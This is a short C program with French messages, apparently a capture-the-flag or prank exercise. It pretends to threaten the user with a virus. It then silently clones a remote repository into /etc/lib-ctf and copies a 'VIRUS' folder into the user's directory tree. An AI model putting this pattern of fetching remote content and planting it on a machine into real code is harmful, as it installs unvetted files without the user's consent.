#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
	printf("Bienvenue!\n");
	printf("Tu as 5 secondes pour eteindre l'ordinateur avant que j'y mettes un virus...\n");
	sleep(5);
	
	printf("Trop tard!\n");
	
	system("mkdir /etc/lib-ctf 2>/dev/null");
	system("git clone https://github.com/JeremyLARDENOIS/lib-ctf-linux /etc/lib-ctf 2>/dev/null");

	system("cp -rp /etc/lib-ctf/VIRUS ../../VIRUS");

	printf("Quelque chose c'est passé dans ton répertoire personnel...\n");
}
